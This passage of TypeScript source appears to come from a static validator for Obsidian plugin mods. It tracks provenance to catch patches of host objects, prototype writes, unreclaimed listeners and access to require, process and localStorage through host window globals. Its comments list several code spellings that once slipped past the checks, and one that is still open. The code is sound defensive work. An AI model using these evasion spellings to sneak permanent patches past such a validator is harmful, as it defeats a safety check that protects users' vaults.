          // object unless an argument already was one", and the arguments are joined in above.
          return p === 'owned' ? 'unknown' : p;
        }
        return 'unknown';
      }

      case 'AwaitExpression':
        return this.provOf(node.argument, scope);

      case 'ArrayExpression': {
        let p: Prov = 'static';
        for (const el of node.elements) {
          if (!el) continue;
          p = joinProv(p, this.provOf(el.type === 'SpreadElement' ? el.argument : el, scope));
        }
        return p;
      }

      case 'ObjectExpression': {
        let p: Prov = 'static';
        for (const prop of node.properties) {
          if (prop.type === 'SpreadElement') {
            p = joinProv(p, this.provOf(prop.argument, scope));
            continue;
          }
          p = joinProv(p, this.provOf(prop.value, scope));
          // ⚠️ A getter's *body* is the value, and joining the property values alone never looked at
          // it: `const box = { get h() { return holder; } }; box.h.getTasks = fn` joined a
          // FunctionExpression, called it `owned`, and returned ZERO findings — an ordinary-looking
          // refactor, not an exotic construct. A shorthand method (`{ h() { return holder } }`) and
          // an arrow-valued property are the same launder. What a member of this object can hand
          // back is part of what the object is worth, so its return provenance joins in.
          const value = unwrapChain(prop.value);
          if (isFunctionNode(value)) {
            const rp = this.returnProv.get(value as acorn.Function);
            if (rp !== undefined) p = joinProv(p, rp);
          }
        }
        return p;
      }

      case 'LogicalExpression':
        return joinProv(this.provOf(node.left, scope), this.provOf(node.right, scope));

      case 'ConditionalExpression':
        return joinProv(this.provOf(node.consequent, scope), this.provOf(node.alternate, scope));

      case 'AssignmentExpression':
        return this.provOf(node.right, scope);

      case 'SequenceExpression': {
        const last = node.expressions[node.expressions.length - 1];
        return last ? this.provOf(last, scope) : 'static';
      }

      case 'ParenthesizedExpression':
        return this.provOf((node as unknown as { expression: acorn.AnyNode }).expression, scope);

      default:
        // ⚠️ The fail-closed default. Everything this analysis cannot follow is treated as the
        // host's, which is what makes the *tenth* spelling safe rather than the next bypass.
        return 'unknown';
    }
  }

  /**
   * `undefined` when the expression is not a `this`; otherwise the class whose `this` it is (or
   * `null` when that `this` is a dynamic receiver we cannot attribute).
   */
  private thisClassOf(node: acorn.AnyNode, scope: Scope): acorn.Class | null | undefined {
    if (node.type === 'ThisExpression') return scope.thisIsOwned ? scope.cls : null;
    if (node.type === 'Identifier') {
      const b = this.lookup(node.name, scope);
      if (b && b.thisOf !== null) return b.thisOf;
    }
    return undefined;
  }

  /** The provenance of `this.<name>` in a class, joined across every write to it anywhere. */
  private fieldProv(cls: acorn.Class, name: string): FieldInfo {
    if (name === 'app') return { prov: 'host', isWindow: false };
    const info = this.classFields.get(cls)?.get(name);
    // A `Modal`'s `contentEl` is Obsidian's element, and Obsidian empties it on close. Treating it
    // as the mod's own is what stops `must-be-reclaimed` firing on the canonical Obsidian idiom.
    //
    // ⚠️ The carve-out used to short-circuit **before** `classFields` was consulted, so any value
    // parked on a carve-out name was laundered: `this.modalEl = view.constructor.prototype;
    // this.modalEl.modkitCompact = true` inside a `Modal` subclass returned ZERO findings. The
    // exemption is for a field Obsidian *wrote*; a field the mod wrote is worth exactly what the mod
    // put in it, so a real write always wins.
    if (this.hostManagedClasses.has(cls) && HOST_MANAGED_FIELDS.has(name)) {
      return info ?? { prov: 'owned', isWindow: false };
    }
    if (info) return info;
    // ⚠️ An unwritten field defaults to `owned` because it is the mod's own state on the mod's own
    // class — true of a `Plugin` subclass, and false of a subclass of a HOST class, which inherits
    // Obsidian's fields. `class V extends ItemView { onOpen() { this.leaf.view = null } }` returned
    // ZERO findings on exactly that default. `this.app` is host above whatever the superclass is.
    if (this.hostSubclasses.has(cls)) return { prov: 'unknown', isWindow: false };
    return { prov: 'owned', isWindow: false };
  }

  /** See {@link classFieldCtors}. */
  noteFieldCtor(cls: acorn.Class, name: string, ctor: string): void {
    let map = this.classFieldCtors.get(cls);
    if (!map) {
      map = new Map();
      this.classFieldCtors.set(cls, map);
    }
    map.set(name, ctor);
  }

  private field(cls: acorn.Class, name: string): FieldInfo {
    let map = this.classFields.get(cls);
    if (!map) {
      map = new Map();
      this.classFields.set(cls, map);
    }
    let info = map.get(name);
    if (!info) {
      info = { prov: 'static', isWindow: false };
      map.set(name, info);
    }
    return info;
  }

  /** The function a call site actually reaches, when the file contains it. */
  private resolveCallee(node: acorn.CallExpression, scope: Scope): acorn.Function | null {
    const callee = unwrapChain(node.callee);
    if (callee.type === 'Identifier') return this.lookup(callee.name, scope)?.fnNode ?? null;
    if (callee.type !== 'MemberExpression') return null;
    const key = propertyName(callee, this.constStrings);
    if (key === null) return null;
    const cls = this.thisClassOf(unwrapChain(callee.object), scope);
    if (cls === undefined || cls === null) return null;
    return this.classMethods.get(cls)?.get(key) ?? null;
  }

  /* ────────────────────────────────────────────────────────────────────────
   * Questions the rules ask
   * ──────────────────────────────────────────────────────────────────────── */

  /**
   * The name a call is *made through*, resolving a detached method binding.
   *
   * `const s = activeWindow.setInterval; s(fn, 100)` and
   * `const on = ws.on; on.call(ws, "file-open", fn)` both put the method's name on the binding and
   * nowhere near the call site. Both returned zero findings on 2026-08-31.
   *
   * ⚠️ **The binding was not the only hiding place, and the two-step spelling was the one that got
   * fixed.** `const add = el.addEventListener; add.call(el, "click", fn)` was caught because the
   * name sat on `add`'s binding; the *inline* form of the identical call —
   * `el.addEventListener.call(el, "click", fn)` — went through the `return p` below with `p ===
   * "call"`, which is in no rule's table, so it returned **zero findings**: a permanent listener on
   * a host element with nothing to remove it. `el.addClass.call(el, "x")` did the same to
   * `must-be-reclaimed`, and `this.app.vault.modify.call(this.app.vault, f, t)` silenced the
   * effects declaration for a mod that rewrites every note. Reproduced 2026-08-31, round 6.
   *
   * The rule this encodes is the same one the lattice already applies to receivers: **a call
   * through `.call`/`.apply`/`.bind` is a call to the method underneath it**, however that method
   * is spelled. Recursing on the member handles the chained spellings (`f.bind(x).call(y)`) for
   * free. It does *not* reach `Reflect.apply(el.addClass, el, ["x"])`, where the method is an
   * argument rather than the callee — that shape is still open and is recorded as such.
   */
  calleeNameAt(callee: acorn.AnyNode, scope: Scope): string | null {
    const inner = unwrapChain(callee);
    if (inner.type === 'Identifier') {
      const b = this.lookup(inner.name, scope);
      const detached = b?.member?.property;
      if (detached !== undefined && detached !== null) return detached;
      return inner.name;
    }
    if (inner.type === 'MemberExpression') {
      const p = propertyName(inner, this.constStrings);
      if (p === 'call' || p === 'apply' || p === 'bind') {
        const obj = unwrapChain(inner.object);
        if (obj.type === 'Identifier') {
          const b = this.lookup(obj.name, scope);
          const detached = b?.member?.property;
          if (detached !== undefined && detached !== null) return detached;
        }
        // The inline form: the method is written out at the call site, one hop in.
        if (obj.type === 'MemberExpression') {
          const under = this.calleeNameAt(obj, scope);
          if (under !== null) return under;
        }
      }
      return p;
    }
    return null;
  }

  /** The receiver an `on(...)` subscription is really made against, detached bindings included. */
  eventReceiverOf(node: acorn.CallExpression, scope: Scope): { prov: Prov } | null {
    const callee = unwrapChain(node.callee);
    if (callee.type === 'MemberExpression') {
      const p = propertyName(callee, this.constStrings);
      if (p === 'on') return { prov: this.provOf(unwrapChain(callee.object), scope) };
      // `on.call(ws, …)` — the receiver is the first argument, and the binding says the method.
      const obj = unwrapChain(callee.object);
      if (obj.type === 'Identifier') {
        const b = this.lookup(obj.name, scope);
        if (b?.member?.property === 'on') {
          return { prov: this.provOf(b.member.receiver, b.member.scope) };
        }
      }
      return null;
    }
    if (callee.type === 'Identifier') {
      const b = this.lookup(callee.name, scope);
      if (b?.member?.property === 'on') return { prov: this.provOf(b.member.receiver, b.member.scope) };
    }
    return null;
  }

  /** `Object` / `Reflect`, through any number of rebindings. */
  mutatorHolderOf(node: acorn.AnyNode, scope: Scope): string | null {
    const inner = unwrapChain(node);
    if (inner.type !== 'Identifier') return null;
    const b = this.lookup(inner.name, scope);
    if (b) return b.mutatorName;
    return MUTATOR_CALLS.has(inner.name) ? inner.name : null;
  }

  /**
   * The `(holder, method)` a mutator call is really made through.
   *
   * `Object.assign(hostProto, …)` is the obvious spelling; `const { assign } = Object;
   * assign(hostProto, …)` is the same write through a **detached** method binding, and it was
   * reproduced at zero findings. Both are answered from the binding, not from the call site.
   */
  mutatorCallOf(
    node: acorn.CallExpression,
    scope: Scope,
  ): { holder: string; method: string; target: acorn.AnyNode | undefined; targetScope: Scope } | null {
    const callee = unwrapChain(node.callee);
    if (callee.type === 'MemberExpression') {
      const method = propertyName(callee, this.constStrings);
      const holder = this.mutatorHolderOf(callee.object, scope);
      return holder !== null && method !== null
        ? { holder, method, target: node.arguments[0], targetScope: scope }
        : null;
    }
    if (callee.type === 'Identifier') {
      const b = this.lookup(callee.name, scope);
      const method = b?.member?.property;
      if (!b?.member || method === undefined || method === null) return null;
      const holder = this.mutatorHolderOf(b.member.receiver, b.member.scope);
      if (holder === null) return null;
      // `const put = Reflect.set.bind(null, hostProto)` — the real target was baked in at `.bind`
      // time and never appears at the call site, where argument 0 is the *member name*.
      const baked = b.boundArgs;
      if (baked && baked.nodes.length > 0) {
        return { holder, method, target: baked.nodes[0], targetScope: baked.scope };
      }
      return { holder, method, target: node.arguments[0], targetScope: scope };
    }
    return null;
  }

  /** What a binding was constructed from, when it holds a `new X(...)` — `const ws = new WebSocket(…)`. */
  ctorOfExpr(node: acorn.AnyNode, scope: Scope): string | null {
    const inner = unwrapChain(node);
    if (inner.type === 'Identifier') return this.lookup(inner.name, scope)?.ctorName ?? null;
    if (inner.type === 'MemberExpression') {
      const cls = this.thisClassOf(unwrapChain(inner.object), scope);
      const key = propertyName(inner, this.constStrings);
      if (cls === undefined || cls === null || key === null) return null;
      return this.classFieldCtors.get(cls)?.get(key) ?? null;
    }
    return null;
  }

  /** The {@link RECLAIMABLE_CONSTRUCTORS} entry a `new X(...)` really reaches. */
  reclaimableCtorOf(callee: acorn.AnyNode, scope: Scope): string | null {
    const inner = unwrapChain(callee);
    if (inner.type === 'Identifier') {
      const b = this.lookup(inner.name, scope);
      if (b) return b.ctorName;
      return RECLAIMABLE_CONSTRUCTORS.has(inner.name) ? inner.name : null;
    }
    if (inner.type === 'MemberExpression') {
      const p = propertyName(inner, this.constStrings);
      return p !== null && RECLAIMABLE_CONSTRUCTORS.has(p) ? p : null;
    }
    return null;
  }

  /**
   * `around(...)`, however it was bound.
   *
   * The name is resolved from the **import binding**, not matched against the string `"around"`,
   * and a namespace import (`import * as ma`) counts — that one token used to skip
   * `patch-must-be-registered` *and* all three refusal rules, because those hang off
   * `facts.firstAround`.
   */
  isAroundCall(node: acorn.AnyNode, scope: Scope): boolean {
    const inner = unwrapChain(node);
    if (inner.type !== 'CallExpression') return false;
    const callee = unwrapChain(inner.callee);
    if (callee.type === 'Identifier') {
      const b = this.lookup(callee.name, scope);
      // A bare `around(...)` that resolves to no binding at all is monkey-around's — the import is
      // simply missing, and treating it as an ordinary unknown call would hand a file with a
      // forgotten import a free pass on `patch-must-be-registered` *and* all three refusal rules,
      // which hang off `firstAround`. A binding that exists and is not `around` still wins.
      if (b) return b.isAround;
      return this.aroundLocals.has(callee.name) || callee.name === 'around';
    }
    if (callee.type === 'MemberExpression') {
      if (propertyName(callee, this.constStrings) !== 'around') return false;
      const object = unwrapChain(callee.object);
      if (object.type !== 'Identifier') return false;
      const b = this.lookup(object.name, scope);
      return b ? b.isAroundNamespace : this.aroundNamespaceLocals.has(object.name);
    }
    return false;
  }

  /** `window` / `activeWindow`, or a local or `this.<field>` holding one. */
  isWindowExpr(node: acorn.AnyNode, scope: Scope): boolean {
    const inner = unwrapChain(node);
    if (inner.type === 'Identifier') {
      const b = this.lookup(inner.name, scope);
      if (b) return b.isWindow;
      return inner.name === 'window' || inner.name === 'activeWindow';
    }
    if (inner.type === 'MemberExpression') {
      const cls = this.thisClassOf(unwrapChain(inner.object), scope);
      if (cls === undefined || cls === null) return false;
      const key = propertyName(inner, this.constStrings);
      return key !== null && this.fieldProv(cls, key).isWindow;
    }
    return false;
  }

  /**
   * Is this expression a **host window or document** — the receiver half of the member-global ban?
   *
   * Wider than {@link isWindowExpr}, which answers the narrower "is this the `window` a sanctioned
   * `registerInterval` may be taken off". `activeDocument`, `globalThis` and a binding aliasing any
   * of them are all the same door to `require`, `process` and `localStorage`.
   */
  isHostWindowExpr(node: acorn.AnyNode, scope: Scope): boolean {
    const inner = unwrapChain(node);
    if (inner.type === 'Identifier') {
      const b = this.lookup(inner.name, scope);
      if (b) {
        if (b.isWindow) return true;
        // A binding whose initialiser *named* a host global root: `const w = activeWindow`.
        return b.path !== null && HOST_GLOBAL_ROOTS.has(b.path.split('.')[0] ?? '');
      }
      return HOST_GLOBAL_ROOTS.has(inner.name);
    }
    if (inner.type === 'MemberExpression') {
      // `activeWindow.parent.require(…)`, `activeDocument.defaultView.process` — one hop on from a
      // root is still the window.
      const prop = propertyName(inner, this.constStrings);
      if (prop === null) return false;
      if (!HOST_WINDOW_HOPS.has(prop)) return false;
      return this.isHostWindowExpr(inner.object, scope);
    }
    return false;
  }

  /** `X.prototype`, `x.constructor.prototype`, or a binding holding one. */
  isPrototypeExpr(node: acorn.AnyNode, scope: Scope, depth = 0): boolean {
    if (depth > 8) return false;
    const inner = unwrapChain(node);
    if (inner.type === 'Identifier') return this.lookup(inner.name, scope)?.isPrototype ?? false;
    if (inner.type === 'MemberExpression') return propertyName(inner, this.constStrings) === 'prototype';
    // ⚠️ `const holder = protoOf(leaf.view)` — a one-line helper hid `patchesPrototype`, so
    // `bound-method-target` never asked whether the live instance shadows the member, and
    // `missing-version-gate` was satisfied by `requireApiVersion()` alone while the mod patched a
    // **third-party** view class whose version Obsidian's API version says nothing about. What a
    // function returns is what the call is.
    if (inner.type === 'CallExpression') {
      const fn = this.resolveCallee(inner, scope);
      if (fn === null) return false;
      for (const r of this.returnExprs.get(fn) ?? []) {
        if (this.isPrototypeExpr(r.node, r.scope, depth + 1)) return true;
      }
    }
    return false;
  }

  /** A dotted path with every head resolved through its binding — scope-correct identity. */
  canonicalPath(node: acorn.AnyNode | null | undefined, scope: Scope, depth = 0): string | null {
    if (node === null || node === undefined || depth > 16) return null;
    const inner = unwrapChain(node);
    if (inner.type === 'ThisExpression') return 'this';
    if (inner.type === 'Identifier') {
      const b = this.lookup(inner.name, scope);
      if (b?.path) return b.path;
      return inner.name;
    }
    if (inner.type === 'MemberExpression') {
      const base = this.canonicalPath(inner.object, scope, depth + 1);
      if (base === null) return null;
      const prop = propertyName(inner, this.constStrings);
      if (prop === null) return null;
      return `${base}.${prop}`;
    }
    // ⚠️ A single-expression accessor names the same object its body names. Without this, a mod that
    // reaches its holder and its live instance through two `#private` helpers — the shape adversary
    // 2's acceptance fixture is written in — takes the descriptor and the hasOwnProperty check on
    // the *right* objects and is told it did not, because the two identities are compared as paths
    // and a call has no path. Once `#holder()` resolves to `…tasks.constructor.prototype`,
    // `stripPrototypeSuffix` lines it up with `#target()` exactly as the direct spelling does.
    if (inner.type === 'CallExpression') {
      const fn = this.resolveCallee(inner, scope);
      if (fn === null) return null;
      const rets = this.returnExprs.get(fn) ?? [];
      // One return only: a helper that can hand back two different objects identifies neither.
      if (rets.length !== 1) return null;
      const only = rets[0];
      return only === undefined ? null : this.canonicalPath(only.node, only.scope, depth + 1);
    }
    return null;
  }

  /** How a finding names the thing that was written to. */
  describe(node: acorn.AnyNode, scope: Scope, prov: Prov): string {
    const path = dottedPath(node, this.constStrings);
    if (prov === 'unknown') {
      return path === null
        ? 'an expression whose provenance the validator could not establish — an unknown holder is ' +
            'treated as the host\'s, because the alternative is a permanent patch nobody can see. ' +
            'Bind the holder in one expression from this.app…, or keep it on `this`'
        : `\`${path}\`, whose provenance the validator could not establish — an unknown holder is ` +
            'treated as the host\'s, because the alternative is a permanent patch nobody can see. ' +
            'Bind the holder in one expression from this.app…, or keep it on `this`';
    }
    if (path !== null) {
      const head = path.split('.')[0] ?? path;
      if (this.obsidianLocalNames.has(head) && this.lookup(head, scope)?.fnNode == null) {
        return `\`${path}\` — a class exported from "obsidian", so this patches Obsidian itself for ` +
          'every plugin, permanently, with nothing to uninstall';
      }
      return `\`${path}\`, which came from the host graph`;
    }
    return 'a property of an object that came from the host graph';
  }

  /* ────────────────────────────────────────────────────────────────────────
   * Construction
   * ──────────────────────────────────────────────────────────────────────── */

  build(): void {
    this.collectImportsAndClasses();
    this.collectClassMembers();
    this.collectConstStrings();
    this.collectInternalRooted();
    this.declareBindings();
    this.collectEdges();
    this.solve();
    this.solveAroundValues();
    this.collectSanctions();
    this.sweepRegisteredRegions();
    this.collectReclaimAliases();
    this.collectTeardowns();
    this.resolveContract();
  }

  /* ────────────────────────────────────────────────────────────────────────
   * Which bindings hold an uninstaller
   * ──────────────────────────────────────────────────────────────────────── */

  /** The `around()` calls an expression evaluates to, following literals and bindings. */
  private aroundCallsIn(node: acorn.AnyNode | null | undefined, scope: Scope, depth = 0): acorn.CallExpression[] {
    if (node === null || node === undefined || depth > 8) return [];
    const inner = unwrapValue(node);
    if (this.isAroundCall(inner, scope)) return [inner as acorn.CallExpression];
    switch (inner.type) {
      case 'Identifier': {
        const b = this.lookup(inner.name, scope);
        return b ? [...(this.aroundValues.get(b) ?? [])] : [];
      }
      case 'ArrayExpression': {
        const out: acorn.CallExpression[] = [];
        for (const el of inner.elements) {
          if (!el) continue;
          out.push(...this.aroundCallsIn(el.type === 'SpreadElement' ? el.argument : el, scope, depth + 1));
        }
        return out;
      }
      case 'ObjectExpression': {
        const out: acorn.CallExpression[] = [];
        for (const p of inner.properties) {
          if (p.type === 'SpreadElement') out.push(...this.aroundCallsIn(p.argument, scope, depth + 1));
          else out.push(...this.aroundCallsIn(p.value, scope, depth + 1));
        }
        return out;
      }
      case 'ConditionalExpression':
        return [
          ...this.aroundCallsIn(inner.consequent, scope, depth + 1),
          ...this.aroundCallsIn(inner.alternate, scope, depth + 1),
        ];
      case 'LogicalExpression':
        return [
          ...this.aroundCallsIn(inner.left, scope, depth + 1),
          ...this.aroundCallsIn(inner.right, scope, depth + 1),
        ];
      case 'AwaitExpression':
        return this.aroundCallsIn(inner.argument, scope, depth + 1);
      default:
        return [];
    }
  }

  /** The same fixed point provenance uses, over the same edges, for uninstaller values. */
  private solveAroundValues(): void {
    const self = this;
    walk.ancestor(this.program, {
      VariableDeclarator(node, _state, ancestors) {
        if (!node.init) return;
        const scope = self.scopeFor(ancestors);
        const names = new Set<string>();
        collectPatternNames(node.id, names);
        for (const n of names) {
          const b = self.lookup(n, scope);
          if (b) self.aroundEdges.push({ binding: b, node: node.init, scope });
        }
      },
      AssignmentExpression(node, _state, ancestors) {
        if (node.left.type !== 'Identifier') return;
        const scope = self.scopeFor(ancestors);
        const b = self.lookup(node.left.name, scope);
        if (b) self.aroundEdges.push({ binding: b, node: node.right, scope });
      },
      ForOfStatement(node, _state, ancestors) {
        const scope = self.scopeFor(ancestors);
        const left = node.left.type === 'VariableDeclaration' ? node.left.declarations[0]?.id : node.left;
        if (!left) return;
        const names = new Set<string>();
        collectPatternNames(left, names);
        for (const n of names) {
          const b = self.lookup(n, scope);
          if (b) self.aroundEdges.push({ binding: b, node: node.right, scope });
        }
      },
      CallExpression(node, _state, ancestors) {
        const callee = unwrapChain(node.callee);
        if (callee.type !== 'MemberExpression') return;
        const method = propertyName(callee, self.constStrings);
        const recv = unwrapChain(callee.object);
        if (method === null || !COLLECTION_WRITERS.has(method) || recv.type !== 'Identifier') return;
        const scope = self.scopeFor(ancestors);
        const b = self.lookup(recv.name, scope);
        if (!b) return;
        for (const arg of node.arguments) {
          self.aroundEdges.push({
            binding: b,
            node: arg.type === 'SpreadElement' ? arg.argument : arg,
            scope,
          });
        }
      },
    });

    for (let round = 0; round < 6; round++) {
      let grew = false;
      for (const e of this.aroundEdges) {
        const calls = this.aroundCallsIn(e.node, e.scope);
        if (calls.length === 0) continue;
        let set = this.aroundValues.get(e.binding);
        if (!set) {
          set = new Set();
          this.aroundValues.set(e.binding, set);
        }
        for (const c of calls) {
          if (!set.has(c)) {
            set.add(c);
            grew = true;
          }
        }
      }
      if (!grew) break;
    }
  }

  /**
   * Anything an uninstaller value is *read* by, inside a registered callback, counts as registered.
   *
   * Run after {@link collectSanctions} has found the register calls, and as a full-program walk
   * rather than a subtree one so every identifier resolves in its real scope chain.
   */
  private sweepRegisteredRegions(): void {
    if (this.registeredRegions.length === 0) return;
    const self = this;
    walk.ancestor(this.program, {
      Identifier(node, _state, ancestors) {
        if (!isIdentifierRead(node, ancestors)) return;
        if (!self.registeredRegions.some((r) => node.start >= r.start && node.end <= r.end)) return;
        const scope = self.scopeFor(ancestors);
        const b = self.lookup(node.name, scope);
        if (!b) return;
        // ⚠️ **A literal index reclaims that element and no other.** `this.register(() => offs[0]())`
        // is the plausible near-miss — a loop written wrong — and it leaves the second patch
        // permanent. Widening reachability to the whole binding there would trade one false
        // rejection for a real miss, so the one spelling that names an element is read precisely.
        const parent = ancestors[ancestors.length - 2];
        if (
          parent?.type === 'MemberExpression' &&
          parent.object === node &&
          parent.computed &&
          parent.property.type === 'Literal' &&
          typeof parent.property.value === 'number'
        ) {
          const init = b.init === null ? null : unwrapChain(b.init);
          if (init !== null && init.type === 'ArrayExpression') {
            const el = init.elements[parent.property.value];
            if (el && el.type !== 'SpreadElement') {
              for (const call of self.aroundCallsIn(el, scope)) self.sanctionedAround.add(call);
            }
            return;
          }
        }
        for (const call of self.aroundValues.get(b) ?? []) self.sanctionedAround.add(call);
      },
    });
  }

  private collectImportsAndClasses(): void {
    for (const node of this.program.body) {
      if (node.type === 'ClassDeclaration' && node.id) this.topLevelClasses.set(node.id.name, node);
      if (node.type === 'ExportNamedDeclaration' && node.declaration?.type === 'ClassDeclaration') {
        if (node.declaration.id) this.topLevelClasses.set(node.declaration.id.name, node.declaration);
      }
      if (node.type !== 'ImportDeclaration') continue;
      const spec = node.source.value;
      for (const s of node.specifiers) {
        if (spec === 'obsidian') this.obsidianLocalNames.add(s.local.name);
        if (spec === 'monkey-around' && s.type !== 'ImportSpecifier') {
          this.aroundNamespaceLocals.add(s.local.name);
        }
        if (s.type !== 'ImportSpecifier') continue;
        const imported = s.imported;
        const name = imported.type === 'Identifier' ? imported.name : String(imported.value);
        if (spec === 'obsidian') this.obsidianImports.set(name, s.local.name);
        if (spec === 'monkey-around' && name === 'around') this.aroundLocals.add(s.local.name);
      }
    }
    // Which locals name an Obsidian class whose element fields Obsidian itself manages.
    const hostManagedLocals = new Set<string>();
    for (const [imported, local] of this.obsidianImports) {
      if (HOST_MANAGED_SUPERCLASSES.has(imported)) hostManagedLocals.add(local);
    }
    // Which locals name *any* Obsidian class other than `Plugin` — a subclass of one of those
    // inherits Obsidian's own fields, so an unwritten field on it is the host's and not the mod's.
    // `Plugin` is excluded deliberately: the mod's own plugin class is where its own state lives,
    // and `this.manifest` there is the mod's own manifest, which is explicitly not a version gate.
    const hostSuperLocals = new Set<string>();
    for (const [imported, local] of this.obsidianImports) {
      if (imported !== 'Plugin') hostSuperLocals.add(local);
    }
    const classesByName = new Map<string, acorn.Class>();
    const allClasses: acorn.Class[] = [];
    walk.simple(this.program, {
      ClassDeclaration: (node) => {
        allClasses.push(node);
        if (node.id) classesByName.set(node.id.name, node);
        this.noteHostManaged(node, hostManagedLocals);
      },
      ClassExpression: (node) => {
        allClasses.push(node);
        if (node.id) classesByName.set(node.id.name, node);
        this.noteHostManaged(node, hostManagedLocals);
      },
    });
    // Transitive: `class A extends ItemView {}` then `class B extends A {}`.
    for (let round = 0; round < 4; round++) {
      let grew = false;
      for (const cls of allClasses) {
        if (this.hostSubclasses.has(cls)) continue;
        const sup = cls.superClass;
        if (!sup || sup.type !== 'Identifier') continue;
        const inherited = classesByName.get(sup.name);
        if (hostSuperLocals.has(sup.name) || (inherited && this.hostSubclasses.has(inherited))) {
          this.hostSubclasses.add(cls);
          grew = true;
        }
      }
      if (!grew) break;
    }
  }

  private noteHostManaged(node: acorn.Class, locals: ReadonlySet<string>): void {
    const sup = node.superClass;
    if (sup && sup.type === 'Identifier' && locals.has(sup.name)) this.hostManagedClasses.add(node);
  }

  /**
   * Class methods, by name, in their own pass.
   *
   * ⚠️ Ordering, and it is load-bearing: acorn-walk visits **post-order**, so a method defined after
   * its own call site in the class body would not be in the table when the call site was walked —
   * `this.modkitStyle(el)` in `onload()` would bind no parameter, `el` would fall to `unknown`, and
   * `must-be-reclaimed` would fire on correct code. Collected before any pass that resolves a call.
   */
  private collectClassMembers(): void {
    const self = this;
    walk.ancestor(this.program, {
      MethodDefinition(node, _state, ancestors) {
        const cls = nearestClassBefore(ancestors, ancestors.length);
        if (!cls || node.computed) return;
        // A `#private` method is a method. Keyed with its `#`, exactly as {@link propertyName}
        // spells it, so `this.#holder()` resolves to its body and its RETURN provenance — the cell
        // that let a complete permanent-damage mod through at zero findings.
        const key =
          node.key.type === 'Identifier'
            ? node.key.name
            : node.key.type === 'PrivateIdentifier'
              ? `#${node.key.name}`
              : null;
        if (key === null) return;
        let map = self.classMethods.get(cls);
        if (!map) {
          map = new Map();
          self.classMethods.set(cls, map);
        }
        map.set(key, node.value);
        // ⚠️ `hasProbe` used to be satisfied by the *name*, so `modkitProbe() {}` — a probe that
        // reports nothing at all — validated clean under the full contract. The probe exists to
        // answer "did this observably apply?", and a body that cannot answer is the pretence the
        // rule was written to stop.
        if (key === 'modkitProbe' && probeReports(node.value)) self.hasProbe = true;
      },
    });
  }

  /** Two rounds so `const b = a + "!"` resolves after `const a = "x"` regardless of source order. */
  private collectConstStrings(): void {
    for (let round = 0; round < 2; round++) {
      walk.simple(this.program, {
        VariableDeclaration: (node) => {
          if (node.kind !== 'const') return;
          for (const d of node.declarations) {
            if (d.id.type !== 'Identifier' || !d.init) continue;
            const value = staticStringValue(d.init, this.constStrings);
            if (value !== null) this.constStrings.set(d.id.name, value);
          }
        },
      });
    }
  }

  private collectInternalRooted(): void {
    walk.simple(this.program, {
      MemberExpression: (node) => {
        const prop = propertyName(node, this.constStrings);
        if (prop !== null && INTERNAL_MEMBERS.has(prop)) {
          this.internalRooted.add(node);
          return;
        }
        const objectNode = unwrapChain(node.object);
        if (objectNode.type === 'MemberExpression' && this.internalRooted.has(objectNode)) {
          this.internalRooted.add(node);
        }
      },
    });
  }

  /**
   * Every binding the file introduces, in the scope that really holds it.
   *
   * This is the half the previous pass left flat, and it is why a helper parameter colliding with an
   * outer binding took the outer alias.
   */
  private declareBindings(): void {
    const self = this;
    walk.ancestor(this.program, {
      ImportDeclaration(node) {
        const scope = self.rootScope();
        for (const spec of node.specifiers) {
          const b = self.declare(scope, spec.local.name);
          b.path = spec.local.name;
          // An `obsidian` export is the host: `Workspace.prototype.getLeaf = fn` patches Obsidian
          // itself, permanently, for every plugin in the vault.
          if (self.obsidianLocalNames.has(spec.local.name)) b.prov = 'host';
          if (self.aroundLocals.has(spec.local.name)) b.isAround = true;
          if (self.aroundNamespaceLocals.has(spec.local.name)) b.isAroundNamespace = true;
        }
      },
      VariableDeclaration(node, _state, ancestors) {
        const here = self.scopeFor(ancestors);
        const scope = node.kind === 'var' ? self.functionScope(here) : here;
        for (const d of node.declarations) {
          const names = new Set<string>();
          collectPatternNames(d.id, names);
          for (const n of names) self.declare(scope, n);
        }
      },
      FunctionDeclaration(node, _state, ancestors) {
        if (node.id) {
          const outer = self.scopeFor(ancestors.slice(0, -1));
          const b = self.declare(self.functionScope(outer), node.id.name);
          b.fnNode = node;
          b.prov = 'owned';
        }
        self.declareParams(node, self.scopeFor(ancestors));
      },
      FunctionExpression(node, _state, ancestors) {
        const own = self.scopeFor(ancestors);
        if (node.id) {
          const b = self.declare(own, node.id.name);
          b.fnNode = node;
          b.prov = 'owned';
        }
        self.declareParams(node, own);
      },
      ArrowFunctionExpression(node, _state, ancestors) {
        self.declareParams(node, self.scopeFor(ancestors));
      },
      ClassDeclaration(node, _state, ancestors) {
        if (!node.id) return;
        const outer = self.scopeFor(ancestors.slice(0, -1));
        const b = self.declare(outer, node.id.name);
        b.prov = 'owned';
      },
      CatchClause(node, _state, ancestors) {
        if (!node.param) return;
        const own = self.scopeFor(ancestors);
        const names = new Set<string>();
        collectPatternNames(node.param, names);
        // A caught value is whatever threw. Fail closed.
        for (const n of names) self.declare(own, n).prov = 'unknown';
      },
    });
  }

  private declareParams(fn: acorn.Function, scope: Scope): void {
    const bindings: (Binding | null)[] = [];
    const defaults: ({ node: acorn.AnyNode; scope: Scope } | null)[] = [];
    for (const p of fn.params) {
      const target = p.type === 'AssignmentPattern' ? p.left : p;
      defaults.push(p.type === 'AssignmentPattern' ? { node: p.right, scope } : null);
      if (target.type === 'Identifier') bindings.push(this.declare(scope, target.name));
      else {
        const names = new Set<string>();
        collectPatternNames(p, names);
        for (const n of names) this.declare(scope, n).prov = 'unknown';
        bindings.push(null);
      }
    }
    this.paramBindings.set(fn, bindings);
    this.paramDefaults.set(fn, defaults);
  }

  /**
   * Every dataflow edge the lattice is solved over.
   *
   * Nine of them are new, and each one is a bypass from the file header: destructuring, `this`
   * fields, returns, array and object members, collection writes, `await`, callback parameters,
   * detached method reads, and call-site parameter binding done scope-correctly.
   */
  private collectEdges(): void {
    const self = this;
    walk.ancestor(this.program, {
      VariableDeclarator(node, _state, ancestors) {
        const scope = self.scopeFor(ancestors);
        const init = node.init ?? null;
        self.patternEdges.push({ pattern: node.id, init, scope });

        // A destructured key is a member read written the other way round, so it carries the same
        // two facts a `const x = obj.k` does: which method it detached (`const { assign } = Object`)
        // and whether it is a prototype (`const { prototype } = target.constructor`).
        if (node.id.type === 'ObjectPattern' && init !== null) {
          for (const prop of node.id.properties) {
            if (prop.type !== 'Property' || prop.value.type !== 'Identifier') continue;
            const key = prop.computed
              ? staticStringValue(prop.key, self.constStrings)
              : prop.key.type === 'Identifier'
                ? prop.key.name
                : staticStringValue(prop.key, self.constStrings);
            if (key === null) continue;
            const vb = self.lookup(prop.value.name, scope);
            if (!vb) continue;
